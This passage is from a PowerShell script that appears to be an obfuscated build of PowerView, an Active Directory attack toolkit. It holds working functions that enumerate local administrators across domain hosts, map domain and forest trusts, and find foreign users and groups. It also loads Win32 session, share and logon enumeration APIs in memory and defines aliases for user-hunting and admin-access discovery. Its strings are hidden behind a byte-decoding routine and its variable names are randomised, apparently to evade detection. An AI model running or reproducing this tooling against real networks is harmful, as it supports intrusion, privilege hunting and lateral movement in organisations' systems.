                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (ParseEntry20 @(211,198,107,106,201,192,146,41,105,224,202,204,9,96,145,182,201,62,92,192) @(135,171,83,13,168))
            }
        }
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }
        if($TrustGroups) {
            Write-Verbose (ParseEntry20 @(162,240,52,10,222,42,234,167,145,224,87,74,230,31,195,180,170,240,91,78,221,37,204,166,185,255,48,67,224,42,238,227,185,240,6,67,230,65,246,164,147,192,95,7) @(240,183,98,58,132,114,160,211))
            $afGS1P8 = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique
            $TrustGroupsSIDs = $afGS1P8 | ForEach-Object { 
                Get-NetGroup -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch (ParseEntry20 @(149,8,95,179,65,148,36,27,134,119,137,5,33,159,92,240) @(192,113,111,203,13)) } | ForEach-Object { $_.objectsid }
            }
            $DomainSID = Get-DomainSID -Domain $Domain
        }
        $s8TS = {
            param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)
            $lPdgSYQ = $True
            if($Ping) {
                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($lPdgSYQ) {
                $zQxKEAhW = Get-NetLocalGroup -ComputerName $ComputerName
                if($DomainSID -and $p4f03) {
                    $qbF4Ozdv = ($zQxKEAhW | Where-Object { $_.SID -match '.*-500$' }).SID -replace (ParseEntry20 @(187,88,125,215,23,57,189,202) @(247,12,40,160,90,122,236))
                    $zQxKEAhW = $zQxKEAhW | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($qbF4Ozdv)) -and (-not $_.SID.startsWith($DomainSID))) }
                }
                if($zQxKEAhW -and ($zQxKEAhW.Length -ne 0)) {
                    if($OutFile) {
                        $zQxKEAhW | Export-PowerViewCSV -OutFile $OutFile
                    }
                    else {
                        $zQxKEAhW
                    }
                }
                else {
                    Write-Verbose ((ParseEntry20 @(178,63,177,224,119,77,208,48,190,204,104,114,191,30,189,254,119,64,175,42,147,204,104,113,135,43,161,239,119,79,191,63,149,182,14,111) @(229,70,247,132,62,8)) + $aXOOQM)
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(4,123,66,118,189,74,154,154,54,100,100,127,133,112,191,150,51,116,57,104,150,111,157,141,54,100,107,97,187,96,145,132,8,116,74,109,188,94,184,196,27,98,49,59) @(82,35,12,6,223,39,249,253)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = $DomainSID
                'TrustGroupsSIDs' = $TrustGroupsSIDs
            }
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(228,80,47,189,250,111,13,175,215,110,25,170,250,110,106,232,209,126,21,181,208,64,29,175,233,64,29,177,234,26,13,169,215,68,10,190,210,110,102,163,215,97,18,239,250,104,98,228) @(179,41,95,217)) + $($ComputerName.count))
            $o6bG = 0
            ForEach ($mnZ6k in $ComputerName) {
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(104,62,201,3,165,17,187,158,91,16,136,11,143,57,171,219,94,16,140,9,165,28,163,135,92,41,227,11,143,61,172,214) @(63,71,185,103,236,84,237,235)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(179,178,59,170,89,78,223,37) @(250,245,2,199,16,15,226,24)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}
function Get-NetDomainTrust {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Domain = (Get-NetDomain).Name,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($LDAP -or $DomainController) {
            $NEpqg = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize
            if($NEpqg) {
                $NEpqg.filter = '(&(objectClass=trustedDomain))'
                $NEpqg.FindAll() | Where-Object {$_} | ForEach-Object {
                    $JRNx = $_.Properties
                    $sfP5Y6Pf = New-Object PSObject
                    $YvgO60 = Switch ($JRNx.trustattributes)
                    {
                        0x001 { (ParseEntry20 @(94,52,20,78,139,61,239,69,0,122,14,169,111,229,110,41,73,86,134,51) @(60,89,45,59,211,14,189)) }
                        0x002 { (ParseEntry20 @(74,60,107,203,241,47,60,252,76,34,16,206,201,26,30,165) @(46,100,41,184,171,119,102,144)) }
                        0x004 { (ParseEntry20 @(29,12,225,60,84,19,18,194,48,112,18,33,237,3,101,24,14,240,109,67,39,3,219,33) @(126,84,183,84,55)) }
                        0x008 { (ParseEntry20 @(59,47,85,108,29,194,210,241,57,113,62,108,30,205,169,187,0,26,62,101,35,247,201,252) @(97,66,108,21,71,154,156,193)) }
                        0x010 { (ParseEntry20 @(81,140,111,41,108,97,70,217,71,108,69,60,81,232,16,47,106,63,78,143,68,8,54,39) @(8,191,37,95,15,82)) }
                        0x020 { (ParseEntry20 @(85,214,78,38,146,131,169,68,188,16,76,133,167,168,103,158,70,87,206,249) @(49,228,34,22,243,196,197)) }
                        0x040 { (ParseEntry20 @(6,212,17,23,134,58,206,61,34,135,44,250,1,35,183,82,198,3,49,170,59,203,44,70) @(98,156,91,123,223)) }
                        0x080 { (ParseEntry20 @(116,101,205,79,115,30,213,24,116,117,201,18,115,28,190,7,73,87,213,24,74,122,178,20,115,67,235,9,116,106,235,8,114,74,186,67) @(16,45,135,126)) }
                        0x100 { (ParseEntry20 @(249,68,137,230,198,175,171,179,249,84,141,187,198,173,192,189,199,84,141,177,196,174,175,224,254,123,254,234) @(157,12,195,215,165,156,249,213)) }
                        Default { 
                            Write-Warning ((ParseEntry20 @(87,242,13,96,99,200,1,33,99,204,122,34,98,203,110,104,101,230,122,122,101,237,106,107,96,242,114,35,101,226,109,36,72,228,5,47) @(1,165,56,18)) + $($JRNx.trustattributes));
                            ($($JRNx.trustattributes));
                        }
                    }
                    $auiUZuL = Switch ($JRNx.trustdirection) {
                        0 { (ParseEntry20 @(170,30,79,189,226,175,19,80,157,236,169,100) @(248,89,35,199,187)) }
                        1 { (ParseEntry20 @(218,83,142,11,86,67,28,36,211,69,134,95) @(137,4,187,98,52,112,74,81)) }
                        2 { (ParseEntry20 @(34,190,119,72,37,98,79,188,67,21,45,50) @(118,141,33,120,124,15)) }
                        3 { (ParseEntry20 @(109,198,78,142,240,48,118,199,123,214,195,24,94,153,23,141,243,41,1,150) @(60,171,34,229,145,104)) }
                    }
                    $RnCJmR = New-Object Guid @(,$JRNx.objectguid[0])
                    $sfP5Y6Pf | Add-Member Noteproperty 'SourceName' $Domain
                    $sfP5Y6Pf | Add-Member Noteproperty 'TargetName' $JRNx.name[0]
                    $sfP5Y6Pf | Add-Member Noteproperty 'ObjectGuid' ("{" + $RnCJmR + "}")
                    $sfP5Y6Pf | Add-Member Noteproperty 'TrustType' ($YvgO60)
                    $sfP5Y6Pf | Add-Member Noteproperty 'TrustDirection' ($auiUZuL)
                    $sfP5Y6Pf
                }
            }
        }
        else {
            $zImi = Get-NetDomain -Domain $Domain
            if($zImi) {
                (Get-NetDomain -Domain $Domain).GetAllTrustRelationships()
            }     
        }
    }
}
function Get-NetForestTrust {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest
    )
    process {
        $sTIfQ = Get-NetForest -Forest $Forest
        if($sTIfQ) {
            $sTIfQ.GetAllTrustRelationships()
        }
    }
}
function Find-ForeignUser {
    [CmdletBinding()]
    param(
        [String]
        $UserName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Switch]
        $Recurse,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function Get-ForeignUser {
        param(
            [String]
            $UserName,
            [String]
            $Domain,
            [String]
            $DomainController,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        if ($Domain) {
            $vczOaz = (ParseEntry20 @(147,227,205,78) @(193,166,128,119,243)) + $Domain -replace '\.',',DC='
        }
        else {
            $vczOaz = [String] ([adsi]'').distinguishedname
            $Domain = $vczOaz -replace 'DC=','' -replace ',','.'
        }
        Get-NetUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize | Where-Object {$_.memberof} | ForEach-Object {
            ForEach ($cz9EWqy in $_.memberof) {
                $lCc7KfW = $cz9EWqy.IndexOf((ParseEntry20 @(164,19,16,58) @(246,86,93,3,33,118,45,181)))
                if($lCc7KfW) {
                    $NFoKn = $($cz9EWqy.substring($lCc7KfW)) -replace 'DC=','' -replace ',','.'
                    if ($NFoKn.CompareTo($Domain)) {
                        $GroupName = $cz9EWqy.split(",")[0].split("=")[1]
                        $sUVXGj = New-Object PSObject
                        $sUVXGj | Add-Member Noteproperty 'UserDomain' $Domain
                        $sUVXGj | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $sUVXGj | Add-Member Noteproperty 'GroupDomain' $NFoKn
                        $sUVXGj | Add-Member Noteproperty 'GroupName' $GroupName
                        $sUVXGj | Add-Member Noteproperty 'GroupDN' $cz9EWqy
                        $sUVXGj
                    }
                }
            }
        }
    }
    if ($Recurse) {
        if($LDAP -or $DomainController) {
            $jdtKic = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $jdtKic = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        ForEach($sfP5Y6Pf in $jdtKic) {
            Write-Verbose ((ParseEntry20 @(125,180,97,106,125,204,157,86,186,12,9,111,249,166,76,132,48,19,85,170,168,28,178,51,1,44,209,189,75,187,22,33,86,220,167,90,170,19,9,105,249,156,105,147,54,50,94,166) @(47,227,84,91,31,155,203)) + $sfP5Y6Pf)
            Get-ForeignUser -Domain $sfP5Y6Pf -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        Get-ForeignUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}
function Find-ForeignGroup {
    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Switch]
        $Recurse,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function Get-ForeignGroup {
        param(
            [String]
            $GroupName = '*',
            [String]
            $Domain,
            [String]
            $DomainController,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        if(-not $Domain) {
            $Domain = (Get-NetDomain).Name
        }
        $zQTdc = ((ParseEntry20 @(181,172,55,94) @(231,233,122,103,106,50,206)) + $($Domain.Replace('.', ',DC=')))
        Write-Verbose ((ParseEntry20 @(117,57,133,56,222,41,75,11,238,9,179,72,110,63,129,113) @(39,126,188,76,135,126)) + $zQTdc)
        $KzkkjJJ = @((ParseEntry20 @(241,228,93,28,196,210,94,77) @(167,188,19,112)), (ParseEntry20 @(116,78,64,146,135,110,76,253,111,79,47,156,132,97,106,242) @(38,9,121,230,222,57,32,136)), (ParseEntry20 @(169,217,121,105,216,153,186,129) @(251,234,47,5,187,170,232)))
        Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {
            -not ($KzkkjJJ -contains $_.samaccountname) } | ForEach-Object {
                $GroupName = $_.samAccountName
                $_.member | ForEach-Object {
                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($zQTdc -ne ($_.substring($_.IndexOf((ParseEntry20 @(85,65,49,161) @(7,4,124,152,163))))))) {
                        $of0NvYsD = $_.subString($_.IndexOf((ParseEntry20 @(80,184,212,230) @(2,253,153,223,81,121,219,252)))) -replace 'DC=','' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]
                        $m6bf = New-Object PSObject
                        $m6bf | Add-Member Noteproperty 'GroupDomain' $Domain
                        $m6bf | Add-Member Noteproperty 'GroupName' $GroupName
                        $m6bf | Add-Member Noteproperty 'UserDomain' $of0NvYsD
                        $m6bf | Add-Member Noteproperty 'UserName' $UserName
                        $m6bf | Add-Member Noteproperty 'UserDN' $_
                        $m6bf
                    }
                }
        }
    }
    if ($Recurse) {
        if($LDAP -or $DomainController) {
            $jdtKic = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $jdtKic = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        ForEach($sfP5Y6Pf in $jdtKic) {
            Write-Verbose ((ParseEntry20 @(215,217,46,198,231,217,77,142,220,214,73,135,231,227,120,144,225,198,81,198,230,189,74,144,223,189,81,129,225,214,89,141,204,201,119,130,204,201,73,129,231,217,93,135,231,231,90,202) @(133,142,27,247)) + $sfP5Y6Pf)
            Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}
function Invoke-MapDomainTrust {
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $a6KtT = @{}
    $ktIDa = New-Object System.Collections.Stack
    $PqDo = (Get-NetDomain).Name
    $ktIDa.push($PqDo)
    while($ktIDa.Count -ne 0) {
        $Domain = $ktIDa.Pop()
        if (-not $a6KtT.ContainsKey($Domain)) {
            Write-Verbose ((ParseEntry20 @(29,108,172,251,73,38,25,66,192,146,121,1,45,86,250,173,79,57,5,10,250,249,121,11,6,124,195,188,72,24,13,80,251,248,26,25,46,108,173,173,97,6,114,6) @(79,59,153,202,43,113)) + $Domain + "'")
            $Null = $a6KtT.add($Domain, "")
            try {
                if($LDAP -or $DomainController) {
                    $v9ojgF = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
                }
                else {
                    $v9ojgF = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize
                }
                if($v9ojgF -isnot [system.array]) {
                    $v9ojgF = @($v9ojgF)
                }
                $v9ojgF += Get-NetForestTrust -Forest $Domain
                if ($v9ojgF) {
                    ForEach ($VFmX4 in $v9ojgF) {
                        $hQOuS = $VFmX4.SourceName
                        $a9bB = $VFmX4.TargetName
                        $njOEJj = $VFmX4.TrustType
                        $iOFqRWNC = $VFmX4.TrustDirection
                        $Null = $ktIDa.push($a9bB)
                        $sfP5Y6Pf = New-Object PSObject
                        $sfP5Y6Pf | Add-Member Noteproperty 'SourceDomain' ($hQOuS)
                        $sfP5Y6Pf | Add-Member Noteproperty 'TargetDomain' ($a9bB)
                        $sfP5Y6Pf | Add-Member Noteproperty 'TrustType' ($njOEJj)
                        $sfP5Y6Pf | Add-Member Noteproperty 'TrustDirection' ($iOFqRWNC)
                        $sfP5Y6Pf
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(223,194,51,25,55,253,233,172,235,214,76,4,49,209,254,232) @(136,187,117,125,126,184,191,213)) + $_)
            }
        }
    }
}
$QmG3 = New-InMemoryModule -ModuleName Win32
$ifJ43O = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)
$Q2RlxS4d = psenum $QmG3 WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$EOgY = struct $QmG3 WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $Q2RlxS4d
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$Ff07 = struct $QmG3 WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$uCBIau = struct $QmG3 SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}
$lsABVkT = struct $QmG3 WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}
$BOJuX = struct $QmG3 SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}
$y8rx = $ifJ43O | Add-Win32Type -Module $QmG3 -Namespace 'Win32'
$aJIaD = $y8rx['netapi32']
$sND5Za = $y8rx['advapi32']
$H7dxZ = $y8rx['kernel32']
$uSJ2gRK = $y8rx['wtsapi32']
Set-Alias Get-NetForestDomains Get-NetForestDomain
Set-Alias Get-NetDomainControllers Get-NetDomainController
Set-Alias Get-NetUserSPNs Get-NetUser
Set-Alias Invoke-NetUserAdd Add-NetUser
Set-Alias Invoke-NetGroupUserAdd Add-NetGroupUser
Set-Alias Get-NetComputers Get-NetComputer
Set-Alias Get-NetOUs Get-NetOU
Set-Alias Get-NetGUIDOUs Get-NetOU
Set-Alias Get-NetFileServers Get-NetFileServer
Set-Alias Get-NetSessions Get-NetSession
Set-Alias Get-NetRDPSessions Get-NetRDPSession
Set-Alias Get-NetProcesses Get-NetProcess
Set-Alias Get-UserLogonEvents Get-UserEvent
Set-Alias Get-UserTGTEvents Get-UserEvent
Set-Alias Get-UserProperties Get-UserProperty
Set-Alias Get-ComputerProperties Get-ComputerProperty
Set-Alias Invoke-UserHunterThreaded Invoke-UserHunter
Set-Alias Invoke-ProcessHunterThreaded Invoke-ProcessHunter
Set-Alias Invoke-ShareFinderThreaded Invoke-ShareFinder
Set-Alias Invoke-SearchFiles Find-InterestingFile
Set-Alias Invoke-UserFieldSearch Find-UserField
Set-Alias Invoke-ComputerFieldSearch Find-ComputerField
Set-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccess
Set-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccess
Set-Alias Get-NetDomainTrusts Get-NetDomainTrust
Set-Alias Get-NetForestTrusts Get-NetForestTrust
Set-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrust
Set-Alias Invoke-FindUserTrustGroups Find-ForeignUser
Set-Alias Invoke-FindGroupTrustUsers Find-ForeignGroup
Set-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdmin
Set-Alias Invoke-FindAllUserTrustGroups Find-ForeignUser
Set-Alias Find-UserTrustGroup Find-ForeignUser
Set-Alias Invoke-FindAllGroupTrustUsers Find-ForeignGroup
